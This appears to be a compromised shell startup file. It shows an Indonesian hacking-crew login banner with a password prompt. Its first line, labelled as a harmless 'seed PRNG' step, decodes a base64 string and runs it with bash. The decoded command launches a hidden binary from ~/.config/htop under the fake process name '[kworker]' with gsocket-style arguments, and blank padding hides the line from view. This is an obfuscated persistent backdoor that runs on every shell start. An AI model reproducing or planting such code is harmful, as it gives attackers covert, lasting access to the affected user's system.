# DO NOT REMOVE THIS LINE. SEED PRNG. #core-kernel
{ echo L3Vzci9iaW4vcGtpbGwgLTAgLVUxNTc1IGNvcmUgMj4vZGV2L251bGwgfHwgKFRFUk09eHRlcm0tMjU2Y29sb3IgR1NfQVJHUz0iLWsgL2hvbWUvc3RpdHRpaGEvLmNvbmZpZy9odG9wL2NvcmUuZGF0IC1saXFEIiBleGVjIC1hICdba3dvcmtlcl0nICcvaG9tZS9zdGl0dGloYS8uY29uZmlnL2h0b3AvY29yZScgMj4vZGV2L251bGwpCg==|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng core-kernel
























































































































































case $- in
    *i*) ;;
    *) return ;;
esac

trap 'echo -e "\n\e[1;31m[!] masukin aja dulu bwang wkwk\e[0m\n"; continue' INT

expected_hash="0fe4461f3d81ccbd48e2762d740c462f14671ad9880d6cb44274a81971a3c884"
input_hash=""

echo -e "\e[1;36m======================================\e[0m"
echo -e "   \e[1;33mBELAWAN PRIDE! Semangat Sampai Kiamat!\e[0m"
echo -e "\e[1;36m                  ↓↓↓                   \e[0m"
echo -e "\e[1;35m  Link Tele:\e[0m \e[1;36mhttps://t.me/Skclberantakan\e[0m"
echo -e "\e[1;36m======================================\e[0m"

while [[ "$input_hash" != "$expected_hash" ]]; do
    echo -ne "\e[1;36m[+] Masukkan Password: \e[0m"
    read -s input_pass
    echo
    input_hash=$(echo -n "$input_pass" | sha256sum | awk '{print $1}')
    
    if [[ "$input_hash" != "$expected_hash" ]]; then
        echo -e "\e[1;31m[!] Coba Pikir Lg Lebih Keras?\e[0m"
    fi
done

echo -e "\n\e[1;32m[SUCCESS] Akses diterima!\e[0m"
sleep 1

logo='
███████ ███████  ██████  ██      ██████   ██████  ██████  
██      ██      ██    ██ ██      ██   ██ ██  ████      ██ 
███████ █████   ██    ██ ██      ██████  ██ ██ ██  █████  
     ██ ██      ██    ██ ██      ██   ██ ████  ██      ██ 
███████ ███████  ██████  ███████ ██████   ██████  ██████  
'

echo -e "\e[1;35m$logo\e[0m"
echo -e "\e[1;36m======================================\e[0m"
echo -e "      \e[1;33mSelamat datang, Seolb03\e[0m \e[1;35m👾\e[0m"
echo -e "\e[1;33m   Siap menjalankan perintah, ketua!"
echo -e "\e[1;36m======================================\e[0m"
echo

timenow=$(date +'%H:%M')
load=$(awk '{print $1 ", " $2 ", " $3}' /proc/loadavg)

echo -e "\e[1;36mThe time now is $timenow UTC\e[0m"
echo -e "\e[1;36mServer load: $load\e[0m"
echo -e ""

trap - INT
